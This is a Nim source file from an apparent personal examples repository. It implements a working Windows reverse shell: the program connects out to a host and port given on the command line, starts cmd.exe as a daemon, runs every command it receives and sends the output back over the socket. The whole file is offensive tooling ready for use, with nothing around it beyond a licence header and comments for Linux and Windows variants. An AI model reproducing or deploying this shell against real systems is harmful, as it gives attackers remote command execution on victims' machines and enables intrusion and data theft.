#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples
    License: BSD 3-Clause
    References: https://github.com/Potato-Industries/nimrs
]#

import net, streams, osproc, os, strutils

let c: Socket = newSocket()
let host = paramStr(1)
let port = paramStr(2).parseInt()
echo "Connected to ",host,":",$port
c.connect(host, Port(port))

var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
var input = p.inputStream()
var output = p.outputStream()

while true:
  let cmds: string = c.recvLine()
  #Linux/MacOS
  #input.writeLine(cmds & ";echo 'DONEDONE'")
  #Windows
  input.writeLine(cmds & " & echo DONEDONE")
  input.flush()
  var o: string
  while output.readLine(o):
    if o == "DONEDONE":
      break
    c.send(o & "\r\L")